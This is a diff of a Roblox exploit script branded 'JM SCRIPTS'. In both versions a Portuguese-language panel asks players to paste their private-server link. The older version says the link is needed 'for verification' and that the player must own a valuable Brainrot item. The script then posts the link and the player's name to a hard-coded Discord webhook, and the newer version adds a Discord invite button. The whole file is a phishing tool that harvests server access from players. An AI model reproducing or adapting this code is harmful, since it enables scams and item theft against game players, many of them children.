@@ -1,165 +1,146 @@
+--========================
 -- CONFIG
-local LOAD_TIME = 15
+--========================
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1468274684557529118/zJwKaKc2q7yb8tCs2XdZSYGuciAlRqX-3sVTro8RMEfwR2Tl1tSUf_-MHMiPVvJxlt17"
+local DISCORD_INVITE = "https://discord.gg/ZPz8Renfz"
 
+--========================
+-- SERVICES
+--========================
 local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
 local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
 local player = Players.LocalPlayer
 
--- =========================
--- WEBHOOK
--- =========================
-local function sendToDiscord(text)
-    local body = HttpService:JSONEncode({content = text})
+--========================
+-- WEBHOOK SEND
+--========================
+local function sendWebhook(text)
     local req = syn and syn.request or http_request
-    if req then
-        req({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = body
+    if not req then return end
+
+    req({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({
+            content = text
         })
-    end
+    })
 end
 
--- =========================
--- UI BASE
--- =========================
+--========================
+-- GUI
+--========================
 local gui = Instance.new("ScreenGui")
 gui.IgnoreGuiInset = true
 gui.Parent = game.CoreGui
 
 local main = Instance.new("Frame", gui)
-main.Size = UDim2.fromScale(1,1)
-main.BackgroundColor3 = Color3.fromRGB(10,6,18)
+main.Size = UDim2.fromScale(0.45,0.5)
+main.Position = UDim2.fromScale(0.5,0.5)
+main.AnchorPoint = Vector2.new(0.5,0.5)
+main.BackgroundColor3 = Color3.fromRGB(5,5,10)
+main.BackgroundTransparency = 1
+
+Instance.new("UICorner", main).CornerRadius = UDim.new(0,20)
 
 local stroke = Instance.new("UIStroke", main)
-stroke.Thickness = 3
+stroke.Color = Color3.fromRGB(170,90,255)
+stroke.Thickness = 2
 
-task.spawn(function()
-    local t = 0
-    while main.Parent do
-        t += 0.01
-        stroke.Color = Color3.fromHSV(t % 1, 1, 1)
-        task.wait()
-    end
-end)
+-- BRILHO
+local gradient = Instance.new("UIGradient", main)
+gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(120,60,200))
+}
 
--- =========================
+-- ANIMAÇÃO DE ENTRADA
+TweenService:Create(
+    main,
+    TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
+    {BackgroundTransparency = 0}
+):Play()
+
+--========================
 -- TÍTULO
--- =========================
+--========================
 local title = Instance.new("TextLabel", main)
-title.Size = UDim2.fromScale(1,0.15)
+title.Size = UDim2.fromScale(1,0.18)
 title.BackgroundTransparency = 1
 title.Text = "JM SCRIPTS"
 title.Font = Enum.Font.GothamBlack
 title.TextScaled = true
-title.TextColor3 = Color3.fromRGB(200,120,255)
+title.TextColor3 = Color3.fromRGB(190,120,255)
 
--- OBRIGATÓRIO
-local rule = Instance.new("TextLabel", main)
-rule.Position = UDim2.fromScale(0.1,0.18)
-rule.Size = UDim2.fromScale(0.8,0.07)
-rule.BackgroundTransparency = 1
-rule.TextScaled = true
-rule.TextWrapped = true
-rule.Font = Enum.Font.GothamBold
-rule.TextColor3 = Color3.fromRGB(255,80,80)
-rule.Text = "⚠️ OBRIGATÓRIO: tenha pelo menos 1 Brainrot de 10M+"
-
--- AVISO
-local warnLabel = Instance.new("TextLabel", main)
-warnLabel.Position = UDim2.fromScale(0.1,0.25)
-warnLabel.Size = UDim2.fromScale(0.8,0.05)
-warnLabel.BackgroundTransparency = 1
-warnLabel.TextScaled = true
-warnLabel.TextWrapped = true
-warnLabel.Font = Enum.Font.Gotham
-warnLabel.TextColor3 = Color3.fromRGB(180,180,180)
-warnLabel.Text = "ℹ️ Aviso: o link do servidor será enviado para verificação."
-
--- DESCRIÇÃO
-local desc = Instance.new("TextLabel", main)
-desc.Position = UDim2.fromScale(0.1,0.31)
-desc.Size = UDim2.fromScale(0.8,0.1)
-desc.BackgroundTransparency = 1
-desc.TextScaled = true
-desc.TextWrapped = true
-desc.Font = Enum.Font.Gotham
-desc.TextColor3 = Color3.fromRGB(220,220,220)
-desc.Text = "Cole o link do seu servidor privado abaixo."
-
--- TEXTBOX
+--========================
+-- INPUT
+--========================
 local box = Instance.new("TextBox", main)
-box.Position = UDim2.fromScale(0.15,0.43)
-box.Size = UDim2.fromScale(0.7,0.1)
-box.PlaceholderText = "Cole o link do servidor privado aqui"
-box.TextScaled = true
-box.ClearTextOnFocus = false
+box.Size = UDim2.fromScale(0.9,0.14)
+box.Position = UDim2.fromScale(0.05,0.25)
+box.PlaceholderText = "Cole aqui o link do seu server privado"
+box.Text = ""
 box.Font = Enum.Font.Gotham
-box.BackgroundColor3 = Color3.fromRGB(30,18,45)
-box.TextColor3 = Color3.new(1,1,1)
-Instance.new("UICorner", box).CornerRadius = UDim.new(0,16)
+box.TextScaled = true
+box.BackgroundColor3 = Color3.fromRGB(15,15,25)
+box.TextColor3 = Color3.fromRGB(255,255,255)
 
--- BOTÃO
-local btn = Instance.new("TextButton", main)
-btn.Position = UDim2.fromScale(0.3,0.56)
-btn.Size = UDim2.fromScale(0.4,0.1)
-btn.Text = "ENVIAR LINK"
-btn.TextScaled = true
-btn.Font = Enum.Font.GothamBold
-btn.BackgroundColor3 = Color3.fromRGB(160,0,255)
-btn.TextColor3 = Color3.new(1,1,1)
-Instance.new("UICorner", btn).CornerRadius = UDim.new(0,18)
+Instance.new("UICorner", box).CornerRadius = UDim.new(0,14)
+Instance.new("UIStroke", box).Color = Color3.fromRGB(140,80,220)
 
--- =========================
--- LOADING
--- =========================
-local loading = Instance.new("Frame", gui)
-loading.Size = UDim2.fromScale(1,1)
-loading.BackgroundColor3 = Color3.fromRGB(8,5,15)
-loading.Visible = false
+--========================
+-- AVISO
+--========================
+local warn = Instance.new("TextLabel", main)
+warn.Size = UDim2.fromScale(0.9,0.12)
+warn.Position = UDim2.fromScale(0.05,0.41)
+warn.BackgroundTransparency = 1
+warn.TextWrapped = true
+warn.TextScaled = true
+warn.Font = Enum.Font.Gotham
+warn.TextColor3 = Color3.fromRGB(200,200,200)
+warn.Text = "⚠️ Ao enviar, você concorda que esse link será enviado para a equipe JM Scripts."
 
-local loadingText = Instance.new("TextLabel", loading)
-loadingText.Position = UDim2.fromScale(0.1,0.4)
-loadingText.Size = UDim2.fromScale(0.8,0.12)
-loadingText.BackgroundTransparency = 1
-loadingText.TextScaled = true
-loadingText.Font = Enum.Font.GothamBold
-loadingText.TextColor3 = Color3.fromRGB(200,140,255)
-loadingText.Text = "Carregando..."
+--========================
+-- BOTÃO ENVIAR
+--========================
+local send = Instance.new("TextButton", main)
+send.Size = UDim2.fromScale(0.4,0.14)
+send.Position = UDim2.fromScale(0.05,0.58)
+send.Text = "Enviar"
+send.Font = Enum.Font.GothamBold
+send.TextScaled = true
+send.BackgroundColor3 = Color3.fromRGB(120,60,200)
+send.TextColor3 = Color3.fromRGB(255,255,255)
 
-local barBg = Instance.new("Frame", loading)
-barBg.Position = UDim2.fromScale(0.2,0.55)
-barBg.Size = UDim2.fromScale(0.6,0.04)
-barBg.BackgroundColor3 = Color3.fromRGB(40,20,60)
-Instance.new("UICorner", barBg).CornerRadius = UDim.new(0,20)
+Instance.new("UICorner", send).CornerRadius = UDim.new(0,16)
 
-local bar = Instance.new("Frame", barBg)
-bar.Size = UDim2.fromScale(0,1)
-bar.BackgroundColor3 = Color3.fromRGB(180,0,255)
-Instance.new("UICorner", bar).CornerRadius = UDim.new(0,20)
+send.MouseButton1Click:Connect(function()
+    if box.Text == "" then return end
+    sendWebhook(
+        "🔗 **Server Privado Enviado**\n" ..
+        "👤 Player: "..player.Name.."\n" ..
+        "📎 Link: "..box.Text
+    )
+    send.Text = "Enviado ✔"
+end)
 
--- =========================
--- CLICK
--- =========================
-btn.MouseButton1Click:Connect(function()
-    if box.Text == "" then
-        btn.Text = "COLE O LINK ❌"
-        task.wait(1)
-        btn.Text = "ENVIAR LINK"
-        return
-    end
+--========================
+-- BOTÃO DISCORD
+--========================
+local discord = Instance.new("TextButton", main)
+discord.Size = UDim2.fromScale(0.4,0.14)
+discord.Position = UDim2.fromScale(0.55,0.58)
+discord.Text = "Discord"
+discord.Font = Enum.Font.GothamBold
+discord.TextScaled = true
+discord.BackgroundColor3 = Color3.fromRGB(90,90,255)
+discord.TextColor3 = Color3.fromRGB(255,255,255)
 
-    sendToDiscord(box.Text)
+Instance.new("UICorner", discord).CornerRadius = UDim.new(0,16)
 
-    main.Visible = false
-    loading.Visible = true
-
-    TweenService:Create(
-        bar,
-        TweenInfo.new(LOAD_TIME, Enum.EasingStyle.Linear),
-        {Size = UDim2.fromScale(0.95,1)}
-    ):Play()
+discord.MouseButton1Click:Connect(function()
+    setclipboard(DISCORD_INVITE)
 end)
